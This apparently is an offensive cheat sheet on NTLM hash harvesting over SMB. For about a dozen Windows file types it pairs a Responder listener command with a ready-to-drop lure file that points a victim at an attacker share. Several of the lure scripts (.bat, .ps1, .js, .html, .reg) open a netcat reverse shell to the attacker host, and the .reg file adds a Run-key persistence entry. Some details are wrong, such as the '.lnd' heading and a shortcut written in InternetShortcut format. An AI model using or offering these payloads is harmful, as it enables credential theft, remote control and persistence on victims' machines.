
# NTLM Hash Harvesting Methods

sometimes you need a user to call back to your machine to steal a NTLM hash! Here are methods that work in SMB! Great for NTLM Relay Attacks!

# 🎃SMB - READ AND WRITE 🎃

## 🐈‍⬛.scf file🐈‍⬛

A .scf file is a shell command file

## ⭐ Attacker

sudo responder -w -I tun0

##🌙 Victim

make a .scf file for the victim to click on!

NTLMHarvester.scf

```
[Shell]
Command=2
IconFile=\\10.10.14.4\tools\nc.ico
[Taskbar]
Command=ToggleDesktop
```

## 🐈‍⬛ .lnd (Windows Shortcut) file 🐈‍⬛

A Windows Shortcut file that can execute programs or scripts located on a network share, enabling attackers to run malicious executables when clicked.

## ⭐ Attacker

```
sudo responder -w -I tun0
```
## 🌙 Victim 

NTLMHarvester.lnk
```
[InternetShortcut]
URL=\\10.10.14.4\tools\nc.exe
IconFile=\\10.10.14.4\tools\nc.ico
```


## 🐈‍⬛ .vbs file 🐈‍⬛

A Visual Basic Script that can automate tasks or execute commands on a Windows system, often used for stealthy command execution.

## ⭐ Attacker


```
sudo responder -w -I tun0
```
## 🌙 Victim Name of file: NTLMHarvester.vbs

```
Set objShell = CreateObject("WScript.Shell")
objShell.Run "\\10.10.14.4\tools\nc.exe", 0, False
```
## 🐈‍⬛ .bat file 🐈‍⬛

A Batch file containing a series of commands that can be executed in the command prompt, often used for running scripts or commands.

## ⭐ Attacker
```
sudo responder -w -I tun0
```
## 🌙 Victim Name of file: NTLMHarvester.bat

```
@echo off
start \\10.10.14.4\tools\nc.exe -e cmd.exe 10.10.14.4 4444
```
## 🐈‍⬛.ps1 file 🐈‍⬛

A PowerShell script file that can execute complex commands on Windows systems, capable of running various scripts and automating tasks.

## ⭐ Attacker

```
sudo responder -w -I tun0
```
## 🌙 Victim Name of file: NTLMHarvester.ps1

```
Invoke-Expression -Command "Start-Process -FilePath '\\10.10.14.4\tools\nc.exe' -ArgumentList '-e cmd.exe 10.10.14.4 4444'"
```
## 🐈‍⬛ .js file 🐈‍⬛

A JavaScript file that can be executed via Windows Script Host, capable of running commands on a Windows machine.

## ⭐ Attacker

```
sudo responder -w -I tun0
```
## 🌙 Victim Name of file: NTLMHarvester.js

```
var shell = new ActiveXObject("WScript.Shell");
shell.run("\\\\10.10.14.4\\tools\\nc.exe -e cmd.exe 10.10.14.4 4444", 0);
```
## 🐈‍⬛ .html file 🐈‍⬛

An HTML file that can include JavaScript, used to execute scripts or commands when opened in a browser or HTML application.

## ⭐ Attacker

```
sudo responder -w -I tun0
```
## 🌙 Victim Name of file: NTLMHarvester.html

```
<html>
<head>
<title>NTLM Harvester</title>
<script>
var shell = new ActiveXObject("WScript.Shell");
shell.Run('\\\\10.10.14.4\\tools\\nc.exe -e cmd.exe 10.10.14.4 4444', 0);
</script>
</head>
<body>
</body>
</html>
```

## 🐈‍⬛ .url file 🐈‍⬛

A URL file is a simple text file that contains a web address. When opened, it launches the default web browser to navigate to that address, making it useful for redirecting users to malicious sites.

## ⭐ Attacker


```
sudo responder -w -I tun0
```
## 🌙 Victim Name of file: NTLMHarvester.url


```
[InternetShortcut]
URL=\\10.10.14.4\malicious-page.html
IconFile=\\10.10.14.4\tools\icon.ico
```
## 🐈‍⬛ .library-ms file 🐈‍⬛

A Library file in Windows is used to group various folders together in one view. A malicious .library-ms file can redirect file operations or trigger scripts, although this method is less commonly exploited.

## ⭐ Attacker


```
sudo responder -w -I tun0
```
## 🌙 Victim Name of file: NTLMHarvester.library-ms


```
<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<Library>
  <DisplayName>NTLM Harvester</DisplayName>
  <LocationType>0</LocationType>
  <PathList>
    <Path>\\10.10.14.4\tools\</Path>
  </PathList>
</Library>
```
## 🐈‍⬛ .searchConnector-ms file 🐈‍⬛

A Search Connector file is used to define a search provider in Windows. It can be manipulated to create a malicious connection that performs unwanted searches or downloads.

## ⭐ Attacker


```
sudo responder -w -I tun0
```
## 🌙 Victim Name of file: NTLMHarvester.searchConnector-ms


```
<?xml version="1.0" encoding="utf-8"?>
<SearchConnector>
  <Name>NTLM Harvester</Name>
  <SearchUrl>\\10.10.14.4\malicious-search</SearchUrl>
  <Icon>\\10.10.14.4\tools\search-icon.ico</Icon>
</SearchConnector>
```
## 🐈‍⬛ .reg file 🐈‍⬛

 A Registry file allows users to add or modify registry entries in Windows. Malicious .reg files can execute commands or set configurations that may compromise the system's security.

## ⭐ Attacker


```
sudo responder -w -I tun0
```
## 🌙 Victim Name of file: NTLMHarvester.reg


```
Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]
"NTLMHarvester"="\\\\10.10.14.4\\tools\\nc.exe -e cmd.exe 10.10.14.4 4444"
```
